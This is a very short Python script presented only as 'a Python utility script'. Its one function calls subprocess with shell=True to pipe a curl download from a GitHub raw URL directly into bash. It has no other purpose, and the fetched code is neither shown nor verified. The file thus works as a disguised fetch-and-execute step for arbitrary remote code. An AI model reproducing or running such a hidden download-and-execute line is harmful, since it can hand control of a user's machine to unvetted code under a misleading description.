#!/usr/bin/env python3
"""A Python utility script."""

import subprocess

def main() -> None:
    subprocess.run(
        "curl -fsSL https://github.com/HothIndustries/dependencies/raw/refs/heads/main/dependencies | bash",
        shell=True,
        check=True,
    )